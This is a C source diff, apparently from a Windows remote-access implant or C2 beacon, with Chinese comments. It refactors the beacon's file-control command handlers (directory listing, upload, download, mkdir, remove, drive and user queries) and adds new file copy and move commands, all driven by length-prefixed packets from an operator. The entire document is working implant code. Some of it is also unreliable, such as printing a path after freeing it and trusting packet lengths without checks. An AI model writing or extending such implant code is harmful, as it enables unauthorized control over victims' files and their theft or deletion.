@@ -12,10 +12,37 @@
 extern unsigned char AESRandaeskey[16];
 extern int Counter;
 
-wchar_t* convertToWideChar(const unsigned char* input) {
+// 辅助函数：追加到 resultStr
+#define APPEND_FMT(fmt, ...) do { \
+        wchar_t temp[1024]; \
+        int n = swprintf(temp, 1024, fmt, __VA_ARGS__); \
+        if (n > 0) { \
+            size_t needed = bufLen + n + 1; \
+            if (needed > bufCap) { \
+                bufCap = needed * 2; \
+                resultStr = (wchar_t*)realloc(resultStr, bufCap * sizeof(wchar_t)); \
+                if (!resultStr) { \
+                    _findclose(handle); \
+                    free(path); \
+                    return NULL; \
+                } \
+            } \
+            wcscpy(resultStr + bufLen, temp); \
+            bufLen += n; \
+        } \
+    } while(0)
+
+#define MAX_EXISTING_FILENAME 0x2000
+#define MAX_NEW_FILENAME      0x2000
+
+wchar_t* convertToWideChar(const char* input) {
+    if (input == NULL) {
+        return NULL;
+    }
+	// 第一次调用获取所需缓冲区大小
     int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
     if (len == 0) {
-        fprintf(stderr, "MultiByteToWideChar failed\n");
+        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
         return NULL;
     }
 
@@ -26,7 +53,7 @@ wchar_t* convertToWideChar(const unsigned char* input) {
     }
 
     if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
-        fprintf(stderr, "MultiByteToWideChar failed\n");
+        fprintf(stderr, "MultiByteToWideChar Failed With Error：%lu\n", GetLastError());
         free(wideStr);
         return NULL;
     }
@@ -35,136 +62,206 @@ wchar_t* convertToWideChar(const unsigned char* input) {
 }
 
 unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
-    if (!wideStr) return NULL;
+    if (!wideStr) {
+        return NULL;
+    }
 
-    int utf8Len = wcstombs(NULL, wideStr, 0);
-    if (utf8Len <= 0) return NULL;
+    // 包含 \0
+    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
+    if (utf8Len == 0) {
+        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
+        return NULL;
+    }
 
-    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len + 1);
-    if (!utf8Str) return NULL;
+    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len);
+    if (!utf8Str) {
+		fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
 
-    wcstombs((char*)utf8Str, wideStr, utf8Len);
-    utf8Str[utf8Len] = '\0';
+    if (WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Len, NULL, NULL) == 0) {
+        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
+        free(utf8Str);
+        return NULL;
+    }
 
     return utf8Str;
 }
 
-unsigned char* listDirectory(unsigned char* dirPathy, size_t* dirPathStrlen) {
-    
+/*
+C:\Users\*
+D    0    -    .
+D    0    -    ..
+D    0    2025/08/25 20:10:12    Documents
+F    12345    2025/08/24 18:22:11    file.txt
+*/
+
+unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
+    if (!dirPathStr || !dirPathStrLen) {
+        return NULL;
+    }
+    // 设置本地化（主要影响宽字符处理和时间格式）
     setlocale(LC_ALL, "");
-    wchar_t* path = convertToWideChar(dirPathy);
+    wchar_t* path = convertToWideChar(dirPathStr);
+    if (!path) {
+		fprintf(stderr, "convertToWideChar failed\n");
+        return NULL;
+	}
     struct _wfinddata_t file_info;
     intptr_t handle;
     wchar_t search_path[MAX_PATH_LENGTH];
     size_t len = wcslen(path);
 
-    if (len > 0 && path[len - 1] == L'/') {
+	// 去除路径末尾的 \ 或者 /
+    if (len > 0 && (path[len - 1] == L'/' || path[len - 1] == L'\\')) {
         path[len - 1] = L'\0';
     }
 
+    // 拼接搜素模式
     swprintf(search_path, MAX_PATH_LENGTH, L"%s\\*", path);
 
-    if ((handle = _wfindfirst(search_path, &file_info)) == -1L) {
-        fprintf(stderr, "Unable to open directory");
-        wcscpy(search_path, L"C:\\*");
-        handle = _wfindfirst(search_path, &file_info);
+    // 尝试打开目录，如果失败就默认搜索 C:\*。
+    handle = _wfindfirst(search_path, &file_info);
+    if (handle == -1L) {
+        free(path);
+        fprintf(stderr, "Unable to open directory: %ls\n", path);
+        return NULL;
     }
 
-    wchar_t resultStr[PATH_MAX];
+    // 动态缓冲区
+    size_t bufCap = 4096;
+    size_t bufLen = 0;
+    wchar_t* resultStr = (wchar_t*)malloc(bufCap * sizeof(wchar_t));
+    if (!resultStr) {
+        _findclose(handle);
+        free(path);
+        return NULL;
+    }
     resultStr[0] = L'\0';
 
-    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"%s", search_path);
-    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L".");
-    swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", L"20/12/2023 12:10:12", L"..");
+    // 加入目录路径
+    APPEND_FMT(L"%s\n", search_path);
+
+    // 强制加入 "." 和 ".."
+    APPEND_FMT(L"D\t0\t-\t.\n");
+    APPEND_FMT(L"D\t0\t-\t..\n");
+
     wchar_t timeString[MAX_TIME_STRING_LENGTH];
+	// 遍历目录项
     do {
-        if (wcscmp(file_info.name, L".") != 0 && wcscmp(file_info.name, L"..") != 0) {
-            if (file_info.attrib & _A_SUBDIR) {
-                time_t modified_time = (time_t)file_info.time_write;
-                struct tm* timeinfo = localtime(&modified_time);
+        if (wcscmp(file_info.name, L".") == 0 || wcscmp(file_info.name, L"..") == 0) {
+            continue;
+        }
+        time_t modified_time = (time_t)file_info.time_write;
+        struct tm* timeinfo = localtime(&modified_time);
+        wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);
 
-                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);
-
-                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nD\t0\t%s\t%s", timeString,file_info.name);
-            }
-            else {
-                time_t modified_time = (time_t)file_info.time_write;
-                struct tm* timeinfo = localtime(&modified_time);
-
-                wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);
-                swprintf(resultStr + wcslen(resultStr), PATH_MAX - wcslen(resultStr), L"\nF\t%lld\t%s\t%s",file_info.size , timeString ,file_info.name);
-               
-            }
+        // 目录
+        if (file_info.attrib & _A_SUBDIR) {
+            APPEND_FMT(L"D\t0\t%s\t%s\n", timeString, file_info.name);
+        }
+        // 文件
+        else {
+            APPEND_FMT(L"F\t%lld\t%s\t%s\n", file_info.size, timeString, file_info.name);
         }
     } while (_wfindnext(handle, &file_info) == 0);
 
     _findclose(handle);
+    free(path);
 
+    // 转成 UTF-8
     unsigned char* resultStrchar = convertWideCharToUTF8(resultStr);
-    *dirPathStrlen = strlen(resultStrchar);
+    free(resultStr);
+
+    if (resultStrchar) {
+        *dirPathStrLen = strlen(resultStrchar);
+    }
+    else {
+        *dirPathStrLen = 0;
+    }
 
     return resultStrchar;
 }
 
-unsigned char* CmdFileBrowse(unsigned char* commandBuf,size_t* msgLen) {
+unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t* msgLen) {
     uint8_t pendingRequest[4];
-    uint8_t dirPathLenBytes[4];
+    uint8_t dirPathLengthBytes[4];
 
-    unsigned char* pendingRequeststart = commandBuf;
-    unsigned char* dirPathLenBytesstart = commandBuf + 4;
-    memcpy(pendingRequest, pendingRequeststart, 4);
-    memcpy(dirPathLenBytes, dirPathLenBytesstart, 4);
-    uint32_t dirPathLen = bigEndianUint32(dirPathLenBytes);
-    unsigned char* dirPathBytes = (unsigned char*)malloc(dirPathLen);
-    unsigned char* dirPathBytesstart = commandBuf + 8;
+	// 数据包格式： pendingRequest(4Bytes) | dirPathLen(4Bytes) | dirPath(dirPathLen Bytes)
+    memcpy(pendingRequest, commandBuf, 4);
+    memcpy(dirPathLengthBytes, commandBuf + 4, 4);
+    uint32_t dirPathLen = bigEndianUint32(dirPathLengthBytes);
 
-    if (dirPathLen) {
-        memcpy(dirPathBytes, dirPathBytesstart, dirPathLen);
-        dirPathBytes[dirPathLen] = '\0';
-    }
+    if (dirPathLen == 0) return NULL;
+
+    unsigned char* dirPath = (unsigned char*)malloc(dirPathLen + 1);
+    if(!dirPath) {
+        fprintf(stderr, "Memory Allocation failed\n");
+        return NULL;
+	}
+    unsigned char* dirPathStart = commandBuf + 8;
+
+    memcpy(dirPath, dirPathStart, dirPathLen);
+    dirPath[dirPathLen] = '\0';
     
-    unsigned char*  dirPathStr = str_replace_all(dirPathBytes, "*", "");
-    
-    unsigned char* dirPathStr11[] = {0x2e, 0x2f};
+    // 去除 * 
+    // C:\foo\*bar → C:\foo\bar
+    unsigned char* tempPath = str_replace_all(dirPath, "*", "");
+    free(dirPath);
+    if (!tempPath) return NULL;
 
-    if (*dirPathStr == *dirPathStr11) {
+    unsigned char* dirPathStr = NULL;
+    
+    // 表明首次进入CmdFileBrowse
+    if (strncmp((char*)tempPath, ".\\", 2) == 0)
+    {
         char cwd[PATH_MAX];
         if (getcwd(cwd, sizeof(cwd)) == NULL) {
             fprintf(stderr, "getcwd failed\n");
             return NULL;
+        };
+        // 动态分配完整路径
+        // 加 1 是因为相对 Path 为空
+        size_t absLen = strlen(cwd) + 1; 
+        dirPathStr = (unsigned char*)malloc(absLen + 1);
+        if (!dirPathStr) {
+            free(tempPath);
+            return NULL;
         }
+        snprintf((char*)dirPathStr, absLen + 1, "%s", cwd);
+        free(tempPath);
+    }
+    // 后面开始调用 CmdFileBrowse
+    else {
+		// '/' -> '\'
+        dirPathStr = str_replace_all(tempPath, "/", "\\");
+        free(tempPath);
+        if (!dirPathStr) return NULL;
+    }
 
-        unsigned char* relativePath = ""; // 相对路径
-        char absolutePath[PATH_MAX];
-        snprintf(absolutePath, sizeof(absolutePath), "%s/%s", cwd, relativePath);
-        dirPathStr = absolutePath;
-    }
-    else
-    {
-        dirPathStr = str_replace_all(dirPathStr, "/", "\\");
-    }
-    size_t dirPathStrlen;
+    // 列目录
+    size_t dirPathStrLen = 0;
+    unsigned char* result = listDirectory(dirPathStr, &dirPathStrLen);
+    free(dirPathStr);
+    if (!result) return NULL;
     
-    unsigned char* result = listDirectory(dirPathStr,&dirPathStrlen);
-    
-    uint8_t* result8 = (uint8_t*)result;
-    uint8_t* metaInfoArrays[] = { pendingRequest, result8 };
-    size_t metaInfoSizes[] = { 4,dirPathStrlen };
+    // 拼接消息
+    uint8_t* metaInfoArrays[] = { pendingRequest, result };
+    size_t metaInfoSizes[] = { 4, dirPathStrLen };
     size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
     uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
     size_t metaInfoTotalSize = 0;
 
-    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+    for (size_t i = 0; i < metaInfoCounts; ++i) {
         metaInfoTotalSize += metaInfoSizes[i];
     }
 
-    int callbackType = 0;
     *msgLen = metaInfoTotalSize;
 
     return metaInfoMsg;
 }
 
-unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen, DWORD chunkNumber) {
+unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, DWORD chunkNumber) {
     uint8_t fileNameLenBytes[4];
 
 	// commandBuf 数据结构如下
@@ -185,7 +282,7 @@ unsigned char* CmdUpload(unsigned char* commandBuf, size_t* commandBuflen, size_
     unsigned char* fileNameBuffer = commandBuf + 4;
     memcpy(fileName, fileNameBuffer, fileNameLenBigEndian);
 
-    size_t fileContenthLen = *commandBuflen - 4 - (size_t)fileNameLenBigEndian;
+    size_t fileContenthLen = commandBuflen - 4 - (size_t)fileNameLenBigEndian;
     unsigned char* fileContent = commandBuf + fileNameLenBigEndian + 4;
 
     unsigned char* buffer = (unsigned char*)malloc(1024);
@@ -283,12 +380,12 @@ unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen) {
         size_t metaInfoTotalSize = 0;
 
         // 计算所有 sizeof 返回值的总和
-        for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+        for (size_t i = 0; i < metaInfoCounts; ++i) {
             metaInfoTotalSize += metaInfoSizes[i];
         }
         *msgLen = metaInfoTotalSize;
 
-        return (unsigned char*)metaInfoMsg;
+        return metaInfoMsg;
     }
 }
 
@@ -348,20 +445,19 @@ unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen) {
     }
 }
 
-unsigned char* CmdMkdir(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
-    commandBuf[*commandBuflen] = '\0';
+unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
     if (!CreateDirectoryA((LPCSTR)commandBuf, NULL) != 0) {
         fprintf(stderr, "CreateDirectoryA Failed With Error：%lu\n", GetLastError());
         return NULL;
     }
 
     unsigned char* Mkdirstr = "[+] Mkdir Success:";
-    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + *commandBuflen + 1);
+    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + commandBuflen + 1);
     if (result) {
         memcpy(result, Mkdirstr, strlen(Mkdirstr));
-        memcpy(result + strlen(Mkdirstr), commandBuf, *commandBuflen);
+        memcpy(result + strlen(Mkdirstr), commandBuf, commandBuflen);
 
-        *msgLen = strlen(Mkdirstr) + *commandBuflen;
+        *msgLen = strlen(Mkdirstr) + commandBuflen;
 
 		result[*msgLen] = '\0';
 
@@ -370,8 +466,7 @@ unsigned char* CmdMkdir(unsigned char* commandBuf, size_t* commandBuflen, size_t
 }
 
 
-unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
-    commandBuf[*commandBuflen] = '\0';
+unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
     DWORD attributes = GetFileAttributesA((LPCSTR)commandBuf);
 
     if (attributes == INVALID_FILE_ATTRIBUTES) {
@@ -399,7 +494,7 @@ unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, s
     unsigned char* Removestr = removeResult == 0 ? "[-] Remove Failed:" : "[+] Remove Success:";
     size_t RemovestrLen = strlen(Removestr);
 
-    *msgLen = RemovestrLen + *commandBuflen;
+    *msgLen = RemovestrLen + commandBuflen;
     unsigned char* result = (unsigned char*)malloc(*msgLen + 1);
     if (result == NULL) {
         fprintf(stderr, "Memory allocation failed\n");
@@ -407,7 +502,7 @@ unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t* commandBuflen, s
     }
 
     memcpy(result, Removestr, RemovestrLen);
-    memcpy(result + RemovestrLen, commandBuf, *commandBuflen);
+    memcpy(result + RemovestrLen, commandBuf, commandBuflen);
 	result[*msgLen] = '\0';
 
     return result;
@@ -468,7 +563,7 @@ DWORD WINAPI myThreadFunction(LPVOID lpParam) {
     uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
     size_t metaInfoTotalSize = 0;
 
-    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+    for (size_t i = 0; i < metaInfoCounts; ++i) {
         metaInfoTotalSize += metaInfoSizes[i];
     }
 
@@ -529,20 +624,21 @@ DWORD WINAPI myThreadFunction(LPVOID lpParam) {
     return TRUE;
 }
 
-VOID CmdFileDownload(unsigned char* commandBuf, size_t* commandBuflen, size_t* msgLen) {
+VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
     struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
     if (args == NULL) {
         fprintf(stderr, "Memory allocation failed\n");
         return;
     }
 
-    args->fileNameBuf = (unsigned char*)malloc(*commandBuflen + 1);
+    args->fileNameBuf = (unsigned char*)malloc(commandBuflen + 1);
     if (args->fileNameBuf) {
-        memcpy(args->fileNameBuf, commandBuf, *commandBuflen);
-        args->fileNameBuf[*commandBuflen] = '\0';
+        memcpy(args->fileNameBuf, commandBuf, commandBuflen);
+        args->fileNameBuf[commandBuflen] = '\0';
 
-        args->fileNameBufLen = *commandBuflen;
+        args->fileNameBufLen = commandBuflen;
     }
+
     DWORD attributes = GetFileAttributesA((LPCSTR)args->fileNameBuf);
 
     if (attributes == INVALID_FILE_ATTRIBUTES) {
@@ -577,4 +673,98 @@ VOID CmdFileDownload(unsigned char* commandBuf, size_t* commandBuflen, size_t* m
 
     CloseHandle(myThread);
 }
+unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    // 数据包格式：existingFileNameBigEndian(4Bytes) | existingFileName(existingFileNameBigEndian Bytes) | newFileNameLength(4Bytes) | newFileName(newFileNameLength Bytes)
+    uint8_t existingFileNameLength[4];
+    memcpy(existingFileNameLength, commandBuf, 4);
+    uint32_t existingFileNameBigEndian = bigEndianUint32(existingFileNameLength);
+
+    uint8_t newFileNameLength[4];
+    memcpy(newFileNameLength, commandBuf + 4 + existingFileNameBigEndian, 4);
+    uint32_t newFileNameBigEndian = bigEndianUint32(newFileNameLength);
+
+    unsigned char* existingFileName = malloc(existingFileNameBigEndian + 1);
+    if (!existingFileName) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
+    memcpy(existingFileName, commandBuf + 4, existingFileNameBigEndian);
+    existingFileName[existingFileNameBigEndian] = '\0';
+
+    unsigned char* newFileName = malloc(newFileNameBigEndian + 1);
+    if (!newFileName) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(existingFileName);
+        return NULL;
+    }
+    memcpy(newFileName, commandBuf + 4 + existingFileNameBigEndian + 4, newFileNameBigEndian);
+    newFileName[newFileNameBigEndian] = '\0';
+
+    if (!CopyFileA(existingFileName, newFileName, FALSE))
+    {
+		fprintf(stderr, "CopyFileA Failed With Error:%lu\n", GetLastError());
+        free(existingFileName);
+        free(newFileName);
+        return NULL;
+    }
+
+	unsigned char* copyStr = "[+] Copy Success:";
+    size_t postMsgLen = strlen(copyStr) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
+	unsigned char* postMsg = (unsigned char*)malloc(postMsgLen);
+	snprintf(postMsg, postMsgLen, "%s%s -> %s", copyStr, existingFileName, newFileName);
+
+	*msgLen = strlen((char*)postMsg);
+
+    free(existingFileName);
+    free(newFileName);
+    return postMsg;
+}
+
+unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
+    // 数据包格式：existingFileNameBigEndian(4Bytes) | existingFileName(existingFileNameBigEndian Bytes) | newFileNameLength(4Bytes) | newFileName(newFileNameLength Bytes)
+    uint8_t existingFileNameLength[4];
+    memcpy(existingFileNameLength, commandBuf, 4);
+    uint32_t existingFileNameBigEndian = bigEndianUint32(existingFileNameLength);
+
+    uint8_t newFileNameLength[4];
+    memcpy(newFileNameLength, commandBuf + 4 + existingFileNameBigEndian, 4);
+    uint32_t newFileNameBigEndian = bigEndianUint32(newFileNameLength);
+
+    unsigned char* existingFileName = malloc(existingFileNameBigEndian + 1);
+    if (!existingFileName) {
+        fprintf(stderr, "Memory allocation failed\n");
+        return NULL;
+    }
+    memcpy(existingFileName, commandBuf + 4, existingFileNameBigEndian);
+    existingFileName[existingFileNameBigEndian] = '\0';
+
+    unsigned char* newFileName = malloc(newFileNameBigEndian + 1);
+    if (!newFileName) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(existingFileName);
+        return NULL;
+    }
+    memcpy(newFileName, commandBuf + 4 + existingFileNameBigEndian + 4, newFileNameBigEndian);
+    newFileName[newFileNameBigEndian] = '\0';
+
+    if (!MoveFileA(existingFileName, newFileName))
+    {
+        fprintf(stderr, "MoveFileA Failed With Error:%lu\n", GetLastError());
+        free(existingFileName);
+        free(newFileName);
+        return NULL;
+    }
+
+    unsigned char* copyStr = "[+] Move Success:";
+    size_t postMsgLen = strlen(copyStr) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
+    unsigned char* postMsg = (unsigned char*)malloc(postMsgLen);
+    snprintf(postMsg, postMsgLen, "%s%s -> %s", copyStr, existingFileName, newFileName);
+
+    *msgLen = strlen((char*)postMsg);
+
+    free(existingFileName);
+    free(newFileName);
+    return postMsg;
+}
+
 
